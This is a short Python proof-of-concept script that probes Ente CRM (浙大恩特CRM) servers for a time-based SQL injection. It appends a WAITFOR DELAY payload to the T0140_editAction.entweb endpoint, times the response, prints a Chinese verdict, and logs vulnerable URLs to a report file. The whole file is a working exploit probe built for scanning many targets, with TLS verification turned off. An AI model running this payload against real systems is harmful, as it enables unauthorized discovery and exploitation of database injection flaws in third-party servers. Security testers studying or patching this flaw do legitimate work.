import requests
import time
import buter
import wirtefile

filename = "./reps/浙大恩特CRM-Sql注入-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '''/entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1';waitfor+delay+'0:0:5'--'''

headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
}
def enterSQL(url):
    try:
        start_time = time.time()
        reps = requests.get(url=url + poc, headers=headers, verify=False, timeout=7)
        end_time = time.time()
        if end_time - start_time > 5:
            print(buter.colors.GREEN+  f"存在浙大恩特CRM-Sql注入 url : {url}" + buter.colors.END)
            reptext = url+poc
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现浙大恩特CRM-Sql注入 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
